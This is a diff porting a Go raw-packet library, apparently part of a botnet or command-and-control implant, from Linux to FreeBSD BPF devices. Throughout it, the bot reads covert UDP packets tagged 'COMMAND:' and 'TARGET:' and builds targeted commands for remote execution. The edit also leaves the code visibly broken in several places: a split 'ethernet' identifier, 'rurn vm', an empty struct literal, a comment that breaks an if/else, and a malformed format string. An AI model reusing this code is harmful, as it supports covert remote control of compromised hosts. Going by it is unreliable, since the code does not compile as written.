@@ -1,4 +1,7 @@
-package cattails
+//go:build freebsd
+
+package freebsd
+
 
 import (
 	"bufio"
@@ -10,6 +13,8 @@ import (
 	"net"
 	"os"
 	"strings"
+
+	"syscall"
 
 	"golang.org/x/net/bpf"
 	"golang.org/x/sys/unix"
@@ -63,41 +68,41 @@ func htons(i uint16) uint16 {
 // vm 	--> BPF VM that contains the BPF Program
 //
 // Returns 	--> None
-func ServerReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
+// func ServerReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 
-	// Buffer for packet data that is read in
-	buf := make([]byte, 1500)
+// 	// Buffer for packet data that is read in
+// 	buf := make([]byte, 1500)
 
-	// Read in the packets
-	// num 		--> number of bytes
-	// sockaddr --> the sockaddr struct that the packet was read from
-	// err 		--> was there an error?
-	_, _, err := unix.Recvfrom(fd, buf, 0)
+// 	// Read in the packets
+// 	// num 		--> number of bytes
+// 	// sockaddr --> the sockaddr struct that the packet was read from
+// 	// err 		--> was there an error?
+// 	_, _, err := unix.Recvfrom(fd, buf, 0)
 
-	checkEr(err)
+// 	checkEr(err)
 
-	// Filter packet?
-	// numBytes	--> Number of bytes
-	// err	--> Error you say?
-	numBytes, err := vm.Run(buf)
-	checkEr(err)
-	if numBytes == 0 {
-		// Change "continue" to return for routine logic
-		return nil // 0 means that the packet should be dropped
-		// Here we are just "ignoring" the packet and moving on to the next one
-	}
+// 	// Filter packet?
+// 	// numBytes	--> Number of bytes
+// 	// err	--> Error you say?
+// 	numBytes, err := vm.Run(buf)
+// 	checkEr(err)
+// 	if numBytes == 0 {
+// 		// Change "continue" to return for routine logic
+// 		return nil // 0 means that the packet should be dropped
+// 		// Here we are just "ignoring" the packet and moving on to the next one
+// 	}
 
-	// Parse packet... hopefully
-	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
-	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
-		// Make sure this is my packet
-		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
-			return packet
-		}
-		return nil
-	}
-	return nil
-}
+// 	// Parse packet... hopefully
+// 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
+// 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
+// 		// Make sure this is my packet
+// 		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
+// 			return packet
+// 		}
+// 		return nil
+// 	}
+// 	return nil
+// }
 
 // BotReadPacket reads packets from a socket file descriptor (fd)
 //
@@ -114,7 +119,7 @@ func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 	// num 		--> number of bytes
 	// sockaddr --> the sockaddr struct that the packet was read from
 	// err 		--> was there an error?
-	_, _, err := unix.Recvfrom(fd, buf, 0)
+	_, err := syscall.Read(fd, buf)
 
 	checkEr(err)
 
@@ -133,7 +138,8 @@ func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
 		// Make sure this is my packet
-		if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
+		
+// if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
 			return packet, false
 		} else if strings.Contains(string(packet.ApplicationLayer().Payload()), "TARGET:") {
 			return packet, true
@@ -144,30 +150,53 @@ func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 }
 
 // CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
+//
 //	for binding the socket to an interface
 //
 // ifaceInfo	--> net.Interface pointer
 //
 // Returns		--> syscall.SockaddrLinklayer struct
-func CreateAddrStruct(ifaceInfo *net.Interface) (addr unix.SockaddrLinklayer) {
-	// Create a byte array for the MAC Addr
-	var haddr [8]byte
+// The encoding looks like the following:
+// +----------------------------+
+// | Type             (1 octet) |
+// +----------------------------+
+// | Name length      (1 octet) |
+// +----------------------------+
+// | Address length   (1 octet) |
+//
+// +----------------------------+
+// | Selector length  (1 octet) |
+// +----------------------------+
+// | Data            (variable) |
+// +----------------------------+
+// func CreateAddrStruct(ifaceInfo *net.Interface) (addr syscall.SockaddrDatalink) {
+// 	// Create a byte array for the MAC Addr
+// 	var haddr [8]byte
 
-	// Copy the MAC from the interface struct in the new array
-	copy(haddr[0:7], ifaceInfo.HardwareAddr[0:7])
+// 	// Copy the MAC from the interface struct in the new array
+// 	copy(haddr[0:7], ifaceInfo.HardwareAddr[0:7])
 
-	// Initialize the Sockaddr struct
-	addr = unix.SockaddrLinklayer{
-		Protocol: unix.ETH_P_IP,
-		Ifindex:  ifaceInfo.Index,
-		Halen:    uint8(len(ifaceInfo.HardwareAddr)),
-		Addr:     haddr,
-	}
+// 	// Initialize the Sockaddr struct
+// 	addr = syscall.SockaddrDatalink{
+// 		Len:    uint8(len(ifaceInfo.HardwareAddr)) ,
+// 		Family: 2048,
+// 		Index:  uint16(ifaceInfo.Index),
+// 		Type: ,
+//
+//	Nlen: ,
+// 		Alen: ,
+// 		Slen: ,
+// 		Data: ,
+// 		raw:
+// 		,
+// 		// Addr:   haddr,
+// 	}
 
-	return addr
-}
+// 	return addr
+// }
 
 // SendPacket sends a packet using a provided
+//
 //	socket file descriptor (fd)
 //
 // fd 			--> The file descriptor for the socket to use
@@ -176,17 +205,19 @@ func CreateAddrStruct(ifaceInfo *net.Interface) (addr unix.SockaddrLinklayer) {
 // packetdata	--> The packet to send
 //
 // Returns 	--> None
-func SendPacket(fd int, ifaceInfo *net.Interface, addr unix.SockaddrLinklayer, packetData []byte) {
+func SendPacket(fd int, ifaceInfo *net.Interface, packetData []byte) {
 
 	// Bind the socket
-	checkEr(unix.Bind(fd, &addr))
+	checkEr(syscall.SetBpfInterface(fd, "vtnet0"))
+	// checkEr(unix.Bind(fd, &addr))
 
-	_, err := unix.Write(fd, packetData)
+	_, err := syscall.Write(fd, packetData)
 	checkEr(err)
 }
 
 // CreatePacket takes a net.Interface pointer to access
-// 	things like the MAC Address... and yeah... the MAC Address
+//
+//	things like the MAC Address... and yeah... the MAC Address
 //
 // ifaceInfo	--> pointer to a net.Interface
 //
@@ -204,7 +235,9 @@ func CreatePacket(ifaceInfo *net.Interface, srcIp net.IP,
 	}
 
 	// Ethernet layer
-	ethernet := &layers.Ethernet{
+	e
+// hernet := &layers.Ethernet{
+// 
 		EthernetType: layers.EthernetTypeIPv4,
 		SrcMAC:       ifaceInfo.HardwareAddr,
 		DstMAC:       dstMAC,
@@ -238,7 +271,9 @@ func CreatePacket(ifaceInfo *net.Interface, srcIp net.IP,
 }
 
 // CreateBPFVM creates a BPF VM that contains a BPF program
-// 	given by the user in the form of "[]bpf.RawInstruction".
+//
+//	given by the user in the form of "[]bpf.RawInstruction".
+//
 // You can create this by using "tcpdump -dd [your filter here]"
 //
 // filter	--> Raw BPF instructions generated from tcpdump
@@ -255,7 +290,9 @@ func CreateBPFVM(filter []bpf.RawInstruction) (vm *bpf.VM) {
 	vm, err := bpf.NewVM(insts)
 	checkEr(err)
 
-	return vm
+// 
+//
+	rurn vm
 }
 
 // NewSocket creates a new RAW socket and returns the file descriptor
@@ -263,7 +300,26 @@ func CreateBPFVM(filter []bpf.RawInstruction) (vm *bpf.VM) {
 // Returns --> File descriptor for the raw socket
 func NewSocket() (fd int) {
 
-	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ALL)))
+	// fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ALL)))
+	var i int
+	var dev string
+	var err error
+	dev = "/dev/bpf0"
+	fd = -1
+
+	// Iterating over bpfs to find the open one
+	for {
+		dev = fmt.Sprint("/dev/bpf$s", i)
+		fd, err = syscall.Open(dev, syscall.O_RDWR, syscall.S_IRUSR|syscall.S_IWUSR) // open the file and return the file descriptor. update the perms as needed
+		// syscall.Socket(syscall.PF_LINK, syscall.SOCK_RAW, syscall.PF_INET)
+		if err == nil {
+			break
+		} else {
+			i++
+		}
+	}
+
+	// fd, err := syscall.Open("/dev/bpf0", syscall.O_RDWR, syscall.S_IRUSR|syscall.S_IWUSR)
 	checkEr(err)
 
 	return fd
@@ -291,7 +347,8 @@ func getOutboundIP(addr string) net.IP {
 // addr		--> The IP you want to be able to reach from an interface
 //
 // Returns	--> *net.Interface struct of outward interface
-//			--> net.IP used for creating a packet
+//
+//	--> net.IP used for creating a packet
 func GetOutwardIface(addr string) (byNameiface *net.Interface, ip net.IP) {
 	outboundIP := getOutboundIP(addr)
 
@@ -402,3 +459,59 @@ func CreateTargetCommand(cmd string, ip string) (command string) {
 	command = "TARGET: " + ip + " " + cmd
 	return command
 }
+
+// package main
+
+// import (
+// 	"encoding/hex"
+// 	"fmt"
+// 	"syscall"
+// )
+
+// var lastCmdRan string
+
+// func main() {
+// 	enable := 1
+
+// 	fd, err := syscall.Open("/dev/bpf0", syscall.O_RDWR, syscall.S_IRUSR|syscall.S_IWUSR)
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	err = syscall.SetBpfInterface(fd, "vtnet0")
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	err = syscall.SetBpfImmediate(fd, enable)
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	err = syscall.SetBpfHeadercmpl(fd, enable)
+// 	if err != nil {
+// 		panic(err)
+// 	}
+
+// 	var buf_len int
+// 	buf_len, err = syscall.BpfBuflen(fd)
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	fmt.Printf("buflen %d\n", buf_len)
+
+// 	err = syscall.SetBpfPromisc(fd, enable)
+// 	if err != nil {
+// 		panic(err)
+// 	}
+
+// 	var n int
+// 	for {
+// 		buf := make([]byte, buf_len)
+// 		n, err = syscall.Read(fd, buf)
+// 		if err != nil {
+// 			panic(err)
+// 		}
+// 		//fmt.Printf("% X\n", buf[:n])
+// 		fmt.Printf("\npacket of size %d captured\n", n)
+// 		fmt.Print(hex.Dump(buf[:n]))
+
+// 	}
+// }
